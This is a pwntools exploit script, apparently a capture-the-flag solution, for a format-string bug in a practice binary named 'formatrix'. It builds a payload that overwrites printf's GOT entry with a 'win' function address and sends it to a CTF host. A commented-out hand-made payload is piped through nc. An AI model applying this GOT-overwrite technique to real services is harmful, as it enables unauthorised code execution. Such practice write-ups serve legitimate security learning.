#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./formatrix --host localhost --port 4002
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./formatrix')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'plzpwn.me'
port = int(args.PORT or 4002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()
#{:Location of Overwrite: New Location}

# OLD
# 0x0804b4bc - printf import?
# 0x080491f2 - win export 
# .got.plt:0804B4AC _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC
# .got.plt:0804B4B0 dword_804B4B0   dd 0                    ; DATA XREF: sub_8049030↑r
# .got.plt:0804B4B4 dword_804B4B4   dd 0                    ; DATA XREF: sub_8049030+6↑r
# .got.plt:0804B4B8 off_804B4B8     dd offset setbuf        ; DATA XREF: _setbuf↑r
# .got.plt:0804B4BC off_804B4BC     dd offset printf        ; DATA XREF: _printf↑r

#fmtstr_payload(3, {0x0804b4bc:0x080491f2},0,'byte')

#our 

# .got.plt:08049C08 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC
# .got.plt:08049C0C dword_8049C0C   dd 0                    ; DATA XREF: sub_8048390↑r
# .got.plt:08049C10 dword_8049C10   dd 0                    ; DATA XREF: sub_8048390+6↑r
# .got.plt:08049C14 off_8049C14     dd offset setbuf        ; DATA XREF: _setbuf↑r
# .got.plt:08049C18 off_8049C18     dd offset printf        ; DATA XREF: _printf↑r
# .got.plt:08049C1C off_8049C1C     dd offset fgets         ; DATA XREF: _fgets↑r
# win	08048536	
# 08049C18 -> 08048536

payload = fmtstr_payload(3, {0x08049C18:0x08048536},0,'byte')
print("pay: ["+payload+"]")
#(python -c "print '\xbc\xb4\x04\x08\xbd\xb4\x04\x08\xbe\xb4\x04\x08\xbf\xb4\x04\x08'+'%226x%3\$hhn%159x%4\$hhn%115x%5\$hhn%260x%6\$hhn'"; cat -)| nc localhost 4002
io.recvuntil("You say:")
io.sendline(payload)
io.interactive()

